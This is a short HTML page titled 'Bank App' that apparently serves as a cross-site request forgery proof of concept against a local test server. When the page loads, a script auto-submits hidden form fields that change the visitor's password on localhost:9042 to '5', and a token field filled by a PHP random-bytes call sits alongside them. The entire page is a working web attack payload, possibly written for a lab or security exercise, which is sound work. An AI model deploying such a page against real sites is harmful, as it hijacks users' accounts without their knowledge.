<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bank App</title>
</head>
<body>
    <form id="form" action="http://localhost:9042/change_password.php" method="post">
        <input hidden type="text" name="new_password" value="5">
        <input hidden type="text" name="confirm_password" value="5">
        <input type="hidden" name="_token" value="<?php echo bin2hex(random_bytes(32)); ?>"> 
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("form").submit();
        });
    </script>
</body>
</html>